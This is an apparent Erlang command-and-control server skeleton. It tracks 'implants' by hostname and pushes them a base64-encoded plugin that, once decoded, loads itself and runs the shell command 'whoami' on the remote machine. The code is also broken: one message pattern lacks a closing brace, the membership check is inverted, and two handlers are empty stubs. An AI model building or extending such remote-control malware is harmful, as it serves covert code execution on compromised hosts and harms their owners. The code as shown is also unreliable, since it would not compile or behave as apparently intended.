-module(main).
-export([start/0]).

loop(Implants) ->
    receive
	{heartbeat,Implant,Hostname} ->
	    io:format("IMPLANT: ~p Hostname: ~p~n", [Implant, Hostname]),
	    Implant ! {plugin, "test","LW1vZHVsZSh0ZXN0KS4KLWV4cG9ydChbc3RhcnQvMCxnZXRfcmVzdWx0LzBdKS4KLW9uX2xvYWQoc3RhcnQvMCkuCgpzdGFydCgpIC0+CiAgICBpbzpmb3JtYXQoIkhJIEZST00gVEVTVCBQTFVHSU5+biIpLgoKZ2V0X3Jlc3VsdCgpIC0+CiAgICBpbzpmb3JtYXQoIlJ1bm5pbmcgY29kZX5uIiksCiAgICBvczpjbWQoIndob2FtaSIpLgo="},
	    if 
		member(Implant, Implants) ->
		    loop([Implant|Implants]);
		true ->
		    loop(Implants)
	    end;
	{downloadPlugin, PluginName ->
		void;
	{bindPluginImplant, ImplantName, PluginName} ->
		void
	    
    end,
    receive
    after 10 ->
	    loop(Implants)
    end.




start() ->
    register(c2server, self()),
    loop([]).
